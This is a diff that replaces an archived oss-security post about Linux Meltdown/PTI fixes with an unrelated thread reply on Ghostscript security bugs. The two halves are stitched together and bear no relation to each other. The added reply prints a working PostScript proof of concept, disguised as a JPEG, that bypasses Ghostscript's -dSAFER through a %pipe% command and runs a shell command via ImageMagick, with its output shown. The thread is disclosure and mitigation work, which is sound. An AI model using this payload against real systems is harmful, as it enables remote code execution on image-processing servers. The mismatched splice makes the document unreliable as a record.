@@ -1,44 +1,115 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/10/09/3
-Message-ID: <20181009114126.GA7166@openwall.com>
-Date: Tue, 9 Oct 2018 13:41:26 +0200
-From: Solar Designer <solar@...nwall.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/08/22/3
+Message-ID: <CAOVKCF0Qehz2q3m2vPSAr3vKRAxdHrTbnyk71ApFYnVXuZ-P6Q@mail.gmail.com>
+Date: Wed, 22 Aug 2018 21:09:12 +0300
+From: AmitB <me@...tbl.com>
 To: oss-security@...ts.openwall.com
-Cc: Dave Hansen <dave.hansen@...ux.intel.com>
-Subject: Linux kernel: "Meltdown leaks with Global kernel mapping"
+Subject: Re: Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+I also took a look a copule weeks ago at few of the patches for your
+previous bugs from 2 years ago, and found that one of them is incomplete
+and still allowing RCE (https://bugs.ghostscript.com/show_bug.cgi?id=697178)
 
-I didn't look into this closely, but I think it needs to be brought in
-here.  Back in August, Dave Hansen reported what may be ways to bypass
-PTI protection in the Linux kernel in some cases.  Dave's fixes got into
-Linux 4.18.5, but maybe not into any other releases nor into distros,
-except for those that updated to 4.18.5 (apparently, some SUSE branch
-and some Yocto branch?)
+POC:
+------------------
+$ cat poc.jpg
+%!PS
+<< (ICCProfilesDir) (%pipe%id > /dev/) >> .setuserparams
+currentdevice null true mark /OutputICCProfile (tty)
+.putdeviceparams
+showpage
+$ identify poc.jpg
+uid=1000(amit) gid=1000(amit) groups=1000(amit)
 
-Start of a relevant thread:
+After reviewing all of the comments in the original bug report I saw that
+you actually mentioned this issue, but it was not taken under
+consideration/forgotten for some reason.
+So effectively a public RCE PoC has been avaliable for GhostScript for
+almost 2 years.
 
-https://lists.openwall.net/linux-kernel/2018/08/02/976
+I opened a report two weeks ago at bugs.ghostscript.com:
+699623 Incomplete fix for #697178 Allowing -dSAFER bypass
 
-The Subject says "close two Meltdown leaks with Global kernel mapping",
-but it isn't immediately clear to me what "two" leaks there are.  Only
-one appears to be clearly described:
+But I got no response from them until today.
+If you have others channels of contact with them please let them know about
+this one too.
 
-https://lists.openwall.net/linux-kernel/2018/08/02/979
+On Tue, Aug 21, 2018 at 11:12 PM, Tavis Ormandy <taviso@...gle.com> wrote:
 
-The corresponding commit:
+> Thanks Alex.
+>
+> FWIW, not all of these are visible, but I've started filing bugs, I'll file
+> a few more today and then let the developers work through the most serious
+> ones.
+>
+> 699654 /invalidaccess checks stop working after a failed restore
+> 699655 missing type checking in setcolor
+> 699656 LockDistillerParams boolean missing type checks
+> 699659 missing type check in type checker (!)
+> 699657 .tempfile SAFER restrictions seem to be broken
+> 699658 Bypassing PermitFileReading by handling undefinedfilename error
+> 699660 shading_param incomplete type checking
+> 699661 pdf14 garbage collection memory corruption
+> 699662 calling .bindnow causes sideeffects
+> 699663 .setdistillerkeys memory corruption
+> 699664 corrupt device object after error in job
+>
+> I'm working on getting reproducers working for the developers for all bugs.
+>
+> On Tue, Aug 21, 2018 at 8:22 AM Alex Gaynor <alex.gaynor@...il.com> wrote:
+>
+> > A small note. Both ImageMagick and GraphicsMagick process various file
+> > formats that can nest a different image file inside of them. These are
+> very
+> > frequently implemented with a call to ReadImage(), with no checking that
+> > it's the expected file format. (As a result, the fuzzer finds various
+> > impressive chains, with sometimes 3 different image formats nested inside
+> > of each other).
+> >
+> > The conclusion of this is that people _must not_ attempt to do their own
+> > format detection and then pass the data to IM/GM, because this can be
+> > bypassed with nested formats. It's imperative that GS truly be disabled
+> > with either policy.xml or by uninstall GS.
+> >
+> > Alex
+> >
+> > On Tue, Aug 21, 2018 at 11:01 AM Bob Friesenhahn <
+> > bfriesen@...ple.dallas.tx.us> wrote:
+> >
+> > > On Tue, 21 Aug 2018, Tavis Ormandy wrote:
+> > > >
+> > > > I think those thumbnails should be disabled, but you've probably
+> > noticed
+> > > I
+> > > > think everything related to untrusted ghostscript should be disabled
+> > :-)
+> > >
+> > > I have posted to the GraphicsMagick Announcements mailing list
+> > > regarding your findings (with a link to this list) and suggested that
+> > > a fool-proof solution is that Ghostscript should be uninstalled.
+> > >
+> > > Uninstalling Ghostscript entirely might cause software using libgs to
+> > > not execute at all unless a stub library is put in its place.
+> > >
+> > > Dependencies on Ghostscript are much larger than one would initially
+> > > think due to Postscript being the traditional output from Unix
+> > > software for "printing" and thus it is used as an intermediate format
+> > > in order to convert between formats.  EPS content is also embedded in
+> > > some other formats.
+> > >
+> > > Bob
+> > > --
+> > > Bob Friesenhahn
+> > > bfriesen@...ple.dallas.tx.us,
+> > http://www.simplesystems.org/users/bfriesen/
+> > > GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/
+> > >
+> >
+> >
+> > --
+> > All that is necessary for evil to succeed is for good people to do
+> nothing.
+> >
+>
 
-https://git.kernel.org/pub/scm/linux/kernel/git/tip/tip.git/commit/?h=x86/pti-urgent&id=c40a56a7818cfe735fc93a69e1875f8bba834483
-
-There are mentions of "r/w kernel text issue" and "unused hole" issue -
-is this why "two"?  But "r/w kernel text" feels irrelevant to Meltdown.
-
-I've attached the two LKML postings above for archival on oss-security
-as well.
-
-Alexander
-
-View attachment "lkml-close-two-meltdown-leaks.txt" of type "text/plain" (3099 bytes)
-
-View attachment "lkml-remove-freed-kernel-image-areas.txt" of type "text/plain" (10579 bytes)
